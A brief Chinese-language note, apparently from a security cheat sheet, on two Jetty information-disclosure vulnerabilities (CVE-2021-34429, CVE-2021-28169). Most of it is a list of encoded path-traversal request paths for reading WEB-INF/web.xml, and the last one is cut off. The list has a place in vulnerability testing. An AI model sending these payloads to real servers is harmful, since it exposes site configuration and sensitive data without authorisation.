Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境

### 信息泄露（CVE-2021-34429）

### 信息泄露（CVE-2021-28169）

两个漏洞都是信息泄露，访问特定网站路径有几率爆出一些敏感信息

/%2e/WEB-INF/web.xml

/.%00/WEB-INF/web.xml

/%u002e/WEB-INF/web.xml

/static?/WEB-INF/web.xml

/a/b/..%00/WEB-INF/web.